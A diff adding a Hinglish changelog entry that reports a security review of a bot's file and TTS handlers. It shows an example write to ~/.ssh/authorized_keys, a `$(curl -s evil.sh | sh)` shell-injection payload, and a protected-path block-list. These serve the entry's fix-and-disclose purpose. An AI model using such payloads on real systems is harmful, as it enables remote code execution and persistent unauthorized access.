@@ -124,6 +124,49 @@ baad `tmp` local scope se bahar chala jata tha, script exit pe
 `line 1: tmp: unbound variable` deta tha (aur temp folder delete nahi hota).
 Fix: `trap "rm -rf '$tmp'" EXIT` (value trap lagte waqt hi expand ho jati hai).
 
+## 2.5.3 — code review: teen asli security bugs
+
+Owner ne bola "5-10 minute code check kar". Poora `src/` (10,083 lines) padha,
+path guards fuzz kiye, aur teen cheezein mili jo **tests me nahi pakdi gayi thi**:
+
+### 1. Protected folders sirf read pe block the, **write pe nahi** (serious)
+
+`files.js` me block-list (`~/.ssh`, `~/.gnupg`, `auth_info`, keyrings) sirf
+`mustExist: true` branch me chalti thi. Matlab:
+
+```
+/write ~/.ssh/authorized_keys | ssh-ed25519 AAAA…
+```
+
+…actually kaam karta tha — persistent SSH access. `~/.gnupg/gpg.conf` aur
+WhatsApp creds bhi overwrite ho sakte the. Ab `isBlocked()` dono branches me
+chalti hai (naye file/folder ke parent pe bhi). Regression test added.
+
+### 2. TTS me shell injection (festival engine)
+
+`tts.js` festival ke liye `sh -c "echo … | text2wave -o …"` use karta tha.
+`sanitizeForTTS()` balanced backticks hataata hai par `$(…)` nahi — matlab
+`/voicereply $(curl -s evil.sh | sh)` shell me chalta. Ab `text2wave` ko seedha
+`spawn('text2wave', ['-o', wav], …)` + stdin se text, koi shell nahi.
+
+### 3. Bridge token ka comparison timing-safe nahi tha
+
+`server.js` me token `===` se compare hota tha (LAN pe byte-by-byte timing
+leak). `safeEqual()` file me pehle se maujood thi, bas token pe use nahi ho rahi
+thi. Ab teeno jagah (header, bearer, query) constant-time compare.
+
+Baaki review (jo theek mila): path traversal (`../`, `/etc/passwd`, symlink
+parents) blocked; owner-only gate solid; shell PIN gate; `/api/*` sab token ke
+peeche; `spawn()` sab jagah argv arrays (sirf TTS exception tha).
+
+Verify:
+
+```bash
+npm test    # 93 pass (3 naye tests)
+```
+
+---
+
 ## 2.5.2 — `/open` ka fuzzy match kisi bhi bakwaas naam pe app khol deta tha
 
 Owner ke PC pe test fail: `/open definitely-not-an-app-xyz` ne asli app khol di —
@@ -273,6 +316,7 @@ npm test                              # 90 pass
 | 15 | *2.5* | **`observer.sh test`**: keys, brains, routing preview, asli API call (`--live`), unit tests — ek command | 90 | 61 |
 | 16 | *2.5.1* | **Test report fix**: failing test ka naam + log path; tests asli portal ko touch nahi karte (dead D-Bus) — 43s → 2.5s | 90 | 61 |
 | 17 | *2.5.2* | **`/open` fuzzy-match bug**: bakwaas phrase se asli app khul jati thi (`app` → Observer App) | 90 | 61 |
+| 18 | *2.5.3* | **Security review**: write-path block-list bypass, TTS shell injection, non-constant-time token | 93 | 61 |
 
 Verify karna ho (sab curl, git zero):
 
